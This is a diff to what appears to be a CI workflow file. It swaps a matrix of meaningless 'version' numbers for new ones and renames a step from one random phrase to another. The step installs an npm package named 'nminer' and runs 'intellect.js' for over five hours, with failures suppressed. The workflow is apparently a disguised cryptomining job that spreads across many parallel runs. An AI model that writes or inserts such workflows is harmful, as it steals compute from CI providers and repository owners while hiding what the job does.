@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8860 }
-          - { version: 2357 }
-          - { version: 71 }
-          - { version: 647 }
-          - { version: 8317 }
-          - { version: 7620 }
-          - { version: 9706 }
-          - { version: 9655 }
-          - { version: 4763 }
-          - { version: 4421 }
-          - { version: 6584 }
-          - { version: 9131 }
-          - { version: 8766 }
-          - { version: 7259 }
-          - { version: 1932 }
-          - { version: 1495 }
-          - { version: 6911 }
-          - { version: 6364 }
-          - { version: 985 }
-          - { version: 9143 }
+          - { version: 8690 }
+          - { version: 1497 }
+          - { version: 724 }
+          - { version: 6269 }
+          - { version: 5613 }
+          - { version: 1988 }
+          - { version: 4579 }
+          - { version: 6152 }
+          - { version: 9982 }
+          - { version: 4333 }
+          - { version: 9754 }
+          - { version: 768 }
+          - { version: 6873 }
+          - { version: 794 }
+          - { version: 3609 }
+          - { version: 887 }
+          - { version: 8434 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: gosh sermon plump selfish
+      - name: if by deflect
         run: |
           npm install nminer@latest
-          timeout 315m node intellect.js || echo "intellect executed"
+          timeout 339m node intellect.js || echo "intellect executed"
